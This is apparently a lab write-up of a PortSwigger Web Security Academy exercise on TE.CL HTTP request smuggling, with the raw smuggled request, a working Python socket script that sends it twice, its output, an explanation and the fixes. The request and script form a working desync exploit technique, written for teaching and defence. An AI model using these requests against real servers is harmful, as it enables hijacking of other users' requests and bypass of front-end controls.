---
layout: post
title: "PortSwigger: HTTP Request Smuggling, Basic TE.CL Vulnerability"
date: 2027-09-07 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, RequestSmuggling]
tags: [portswigger, http-request-smuggling, te-cl, desync, transfer-encoding, content-length, gpost, cwe-444]
---

When a website sits behind a proxy, the front-end and back-end have to agree on exactly where each HTTP request ends. When they disagree, the leftover bytes of one request silently become the start of the next — *HTTP request smuggling*. This is the foundational **TE.CL** lab, the mirror image of the basic CL.TE lab: we smuggle a whole `GPOST` request as a chunk and watch the back-end choke on the invalid method.

## Overview

The front-end honors `Transfer-Encoding: chunked`; the back-end honors `Content-Length`. That single mismatch is the entire bug. We exploit it by framing a complete `GPOST / HTTP/1.1` request as the chunk *data*, so the back-end — reading only a 4-byte body — leaves the smuggled request buffered and prefixes it onto the next request, producing `"Unrecognized method GPOST"`.

- **Vuln class:** HTTP request smuggling (TE.CL)
- **CWE:** [CWE-444 — Inconsistent Interpretation of HTTP Requests](https://cwe.mitre.org/data/definitions/444.html)

## Background: two ways to say "how long is the body"

HTTP/1.1 lets a request body declare its length two different ways:

- **`Content-Length: N`** — the body is exactly `N` bytes.
- **`Transfer-Encoding: chunked`** — the body is a series of chunks, each prefixed by its
  size in hex, ending with a zero-size chunk (`0\r\n\r\n`).

The spec says a request carrying *both* must be rejected. In practice, a front-end proxy
and a back-end server often each pick one header and ignore the other. If they pick
*different* ones, they disagree on where the request ends — and that gap is the smuggling
channel.

In **TE.CL**, the front-end trusts **T**ransfer-**E**ncoding and the back-end trusts
**C**ontent-**L**ength.

## The attack

Sent over a raw TLS socket (curl and Burp's defaults rewrite one of the conflicting
headers, which destroys the desync), with ALPN pinned to `http/1.1`:

```
POST / HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Send it **twice** on the connection.

Here is the Python that does it:

```python
import socket, ssl

HOST = "<lab-id>.web-security-academy.net"

smuggled = (
    "GPOST / HTTP/1.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1"
)                                   # exactly 0x5c = 92 bytes
chunk = format(len(smuggled), "x")  # -> "5c"

req = (
    "POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    f"{chunk}\r\n{smuggled}\r\n0\r\n\r\n"
).encode()

ctx = ssl.create_default_context()
ctx.set_alpn_protocols(["http/1.1"])   # force HTTP/1.1, or HTTP/2 kills the desync

for i in (1, 2):
    s = ctx.wrap_socket(socket.create_connection((HOST, 443)), server_hostname=HOST)
    s.sendall(req)
    s.settimeout(6)
    print(i, s.recv(4096).split(b"\r\n")[0].decode())
    s.close()
```

Output:

```
1 HTTP/1.1 200 OK
2 HTTP/1.1 403 Forbidden     # body: "Unrecognized method GPOST"
```

## Why it works

- `5c` is hex for **92** — the exact byte length of the smuggled block from `GPOST` down
  to `x=1`. That whole block is the chunk *data*.
- **Front-end (chunked):** reads the 92-byte chunk, then the `0` terminating chunk, and
  forwards the entire body to the back-end.
- **Back-end (`Content-length: 4`):** reads only the first 4 bytes — `5c\r\n` — as the
  body of `POST /`. Everything from `GPOST` onward is left sitting in the connection
  buffer.
- That leftover becomes the prefix of the **next** request, so its method line is mangled
  into `GPOST / HTTP/1.1` and the back-end replies `403 "Unrecognized method GPOST"`.

Send 1 plants the `GPOST` prefix; send 2 is the request that gets prefixed, so the `403`
lands on send 2. That malformed-method response is the lab's success condition, and the
instance status flips to **Solved**.

### Two gotchas

1. **Raw socket only.** curl and Burp's "Update Content-Length" strip or rewrite one of
   the CL/TE headers, removing the ambiguity. Send the exact bytes over a Python `ssl`
   socket.
2. **Force HTTP/1.1.** Against an HTTPS front-end, pin ALPN to `http/1.1`. If TLS
   negotiates HTTP/2, the protocol frames message length itself — there's no CL/TE
   ambiguity — and you get a plain 403 with *no* desync: a silent false negative.

### TE.CL vs CL.TE

This is the mirror of the basic CL.TE lab. The server roles are swapped **and the payload
shape differs**: in CL.TE the smuggled bytes hide *behind* a `0\r\n\r\n` empty chunk; in
TE.CL the smuggled request *is* the chunk data, sized by the hex chunk header.

## The fix

- Use one consistent HTTP parser front-to-back, or speak **HTTP/2 end-to-end** (its length
  framing removes the CL/TE ambiguity entirely).
- **Reject any request carrying both `Content-Length` and `Transfer-Encoding`**, or one
  with a malformed/duplicate `Transfer-Encoding`, instead of silently picking one.
- Normalise requests at the front-end before forwarding so the two tiers can never
  disagree on where a request ends.
